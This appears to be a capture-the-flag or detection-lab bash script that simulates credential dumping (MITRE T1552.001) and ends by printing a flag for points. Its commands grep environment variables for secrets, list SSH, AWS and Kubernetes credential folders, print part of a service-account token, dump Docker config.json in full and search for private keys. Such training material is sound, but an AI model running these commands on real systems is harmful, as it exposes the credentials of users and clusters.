#!/bin/bash
# Attack: Credential Access via Credential Dumping
# MITRE ATT&CK: Credential Access - T1552.001
# Severity: HIGH
# Description: Attempts to dump credentials from memory and files

set -e
echo "[+] Starting: Credential Access via Credential Dumping"
echo "[+] MITRE ATT&CK: T1552.001 - Unsecured Credentials: Credentials In Files"
echo "[+] Severity: HIGH"
echo ""

echo "[*] Step 1: Searching for credentials in environment variables..."
env | grep -i "pass\|token\|secret\|key\|api" || echo "[*] No credentials found in environment"

echo ""
echo "[*] Step 2: Searching for credential files..."
echo "[*] Checking common locations:"
for path in ~/.ssh ~/.aws ~/.kube /var/run/secrets; do
    if [ -d "$path" ]; then
        echo "[+] Found: $path"
        ls -la "$path" 2>/dev/null | head -5 || true
    fi
done

echo ""
echo "[*] Step 3: Searching for Kubernetes service account tokens..."
if [ -f /var/run/secrets/kubernetes.io/serviceaccount/token ]; then
    echo "[+] Found Kubernetes service account token!"
    echo "[*] Token (first 50 chars): $(head -c 50 /var/run/secrets/kubernetes.io/serviceaccount/token)"
    echo "[*] Namespace: $(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null || echo 'unknown')"
else
    echo "[*] No Kubernetes tokens found"
fi

echo ""
echo "[*] Step 4: Searching for Docker credentials..."
if [ -f ~/.docker/config.json ]; then
    echo "[+] Found Docker credentials!"
    cat ~/.docker/config.json
else
    echo "[*] No Docker credentials found"
fi

echo ""
echo "[*] Step 5: Searching for SSH keys..."
find ~ -name "id_rsa" -o -name "id_ed25519" -o -name "*.pem" 2>/dev/null | head -5

echo ""
echo "[✓] Credential dumping simulation completed"
echo "[i] In a real attack, this would:"
echo "    - Search for AWS credentials (~/.aws/credentials)"
echo "    - Extract SSH private keys"
echo "    - Dump process memory for credentials"
echo "    - Read application configuration files"
echo ""
echo "🚩 FLAG CAPTURED!"
echo "════════════════════════════════════════════════════════════════"
echo ""
echo "  FLAG{memory_credentials_extracted_and_detected}"
echo ""
echo "  Copy this flag and submit it to earn 50 points!"
echo "════════════════════════════════════════════════════════════════"
